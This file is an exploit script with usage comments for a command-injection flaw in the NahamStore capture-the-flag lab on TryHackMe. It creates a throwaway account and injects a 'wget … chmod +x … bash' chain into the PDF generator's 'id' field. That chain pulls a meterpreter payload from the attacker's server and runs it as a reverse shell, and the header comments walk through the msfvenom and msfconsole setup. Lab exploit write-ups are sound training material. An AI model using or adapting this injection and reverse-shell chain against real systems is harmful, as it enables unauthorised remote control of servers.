#!/usr/bin/env python3
####################################################################################################
# This script is designed to exploit the blind Remote Code Execution vulnerability in
# Nahamstore.thm on TryHackMe.com.  The code below creates valid user credentials and uploads
# an MSFVENOM payload to create a meterpreter session with the target machine. The command can
# be modified to whatever the end-user would like by modifying the cmd variable inside the
# gen_payload function of the robber class.
####################################################################################################
# To properly execute this exploit:
#
# 1. Create payload using msfvenom: 
#       msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f elf > shell
# 2. Run server the target can reach out to and grab the paylaod generated above:
#       python3 -m http.server 9999
# 3. (In separate terminal) Run msfconsole:
#       msfconsole
# 4. Set module and payload:
#       use exploit/multi/handler
#       set payload linux/x86/meterpreter/reverse_tcp
# 5. Set LHOST and LPORT to same as in step 1:
#       set LHOST <YOUR_IP>
#       set LPORT <PORT>
# 6. Run msfconsole exploit:
#       exploit
# 7. (In separate terminal) Run this script:
#       python3 rce2.py <LHOST> <LPORT>
# 8. Meterpreter session should open. Explore the machine and find the flag.
#
# Note: 
# If the shell does not create a connection the first time running,  wait a few seconds and run the 
# script again and it will connect to meterpreter and successfully create a connection. This may be 
# due to the command attempting to execute the shell prior to the file being fully downloaded.
####################################################################################################

import argparse
import random
import requests
import string

class robber:
    def __init__(self, myip=None, myport=None):
        if (myip is None) or not(isinstance(myip,str)):
            myip = "127.0.0.1"

        if (myport is None) or not(isinstance(myport,int)):
            myport = 9999

        self.reverseip = myip
        self.serveport = myport
        self.headers = dict()
        self.data_dict = dict()
        self.username = str()
        self.password = str()
        self.session = None

        return

    def gen_random(self, email=None):
        alphabet = string.ascii_lowercase + string.digits
        random_word = str()
        length = random.randint(5,20)
        length_alphabet = len(alphabet) - 1

        print(f"\x1b[2K\r[i] Generating random word of length {length}", end="")

        for i in range(length):
            choice = random.randint(1, length_alphabet)
            random_word += alphabet[choice]

        if email:
            random_word += "@test.local"

        print(f"\r\x1b[2K\r[\x1b[34;1mi\x1b[0m] Random word generated: {random_word}")
        return random_word

    def login(self):
        retval = bool()

        email_input = "login_email"
        pass_input = "login_password"

        target = "http://nahamstore.thm/login"

        login_dict = {
                email_input: self.username,
                pass_input: self.password
        }

        resp = self.session.post(target, data=login_dict)

        if resp.status_code < 400:
            print("[\x1b[33;1m+\x1b[0m] Login successful.")
            retval = True
        else:
            print("[\x1b[31;1m-\x1b[0m] Login failed.")
            retval = False

        return retval

    def set_headers(self, data=None):
        if (data is None) or not(isinstance(data, dict)):
            data = str(self.data_dict)

        self.headers["Host"] = "nahamstore.thm"
        self.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        self.headers["Accept-Language"] = "en-US,en;q=0.5"
        self.headers["Accept-Encoding"] = "gzip, deflate"
        self.headers["Content-Type"] = "application/x-www-form-urlencoded"
        self.headers["Origin"] = "http://nahamstore.thm"
        self.headers["Connection"] = "close"
        self.headers["Referer"] = "http://nahamstore.thm/account/orders/4"

        self.headers["Content-Length"] = str(len(data))

        return 

    def set_payload(self):
        print("[\x1b[33;1m*\x1b[0m] Creating reverse shell command.", end="")

        cmd = f"""wget -O /tmp/shell http://{self.reverseip}:{self.serveport}/shell;chmod +x /tmp/shell;bash -c /tmp/shell"""
        payload = f"""$({cmd})"""
        self.data_dict = {
                "what":"order",
                "id": f"1{payload}"
        }
        print("\r\x1b[2K[\x1b[33;1m+\x1b[0m] Reverse shell command generated.")
        return

    def sign_up(self):
        email_input = "register_email"
        pass_input = "register_password"

        target = "http://nahamstore.thm/register"

        data = {
                email_input: self.username,
                pass_input: self.password
        }

        resp = self.session.post(target, data=data)

        if resp.status_code < 400:
            if "Account already exists with the email" in resp.text:
                print("[\x1b[33;1m*\x1b[0m] Account already exists")
                retval = True
            else:
                print(f"[\x1b[33;1m+\x1b[0m] Registered successfully. ({self.username}:{self.password})")
                retval = True
        else:
            if "Account already exists with the email" in resp.text:
                print("[\x1b[33;1m*\x1b[0m] Account already exists")
                retval = True
            else:
                print(f"[\x1b[31;1m-\x1b[0m] Error registering user. ({resp.status_code} {resp.reason})")
                retval = False

        return retval

    def run_attack(self):
        # Generate random username and password.
        self.username = self.gen_random(email=True)
        self.password = self.gen_random()

        print("[\x1b[33;1m+\x1b[0m] Username and password generated.")

        target = "http://nahamstore.thm/pdf-generator"

        self.session = requests.Session()
        if not(self.sign_up()):
            exit(1)

        if not(self.login()):
            exit(1)

        resp = self.session.post(target, headers=self.headers, data=self.data_dict)
        self.session.close()

        print("[\x1b[33;1m+\x1b[0m] Exploit complete.")
        return

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

def main():
    ############################################################
    # Command Line Arguments
    #
    # These are meant to make the script more robust/modular.
    ############################################################
    parser = argparse.ArgumentParser()
    parser.add_argument("attack_ip", help="Attacker IP address. Used for reverse shell.", type=str)
    parser.add_argument("serve_port", help="Port to contact attack server on.", type=port_type)

    args = parser.parse_args()

    attack_ip = args.attack_ip
    serve_port = args.serve_port
    ############################################################

    store_robber = robber(myip=attack_ip, myport=serve_port)
    store_robber.set_payload()
    store_robber.set_headers()
    store_robber.run_attack()
    return

if __name__ == "__main__":
    main()

